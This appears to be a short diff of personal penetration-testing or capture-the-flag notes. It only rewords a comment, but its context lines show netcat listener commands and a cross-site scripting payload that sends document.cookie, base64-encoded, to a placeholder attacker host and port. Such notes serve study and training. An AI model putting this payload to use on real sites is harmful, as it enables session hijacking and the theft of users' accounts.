@@ -26,7 +26,7 @@ nc -l -p 9001
         nc -nlvp 9001
     fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );
         fetch(): make http request
-        btoa(): convert to base64 (for transport)
+        btoa(): encode with base64 (for transport)
    
     
     
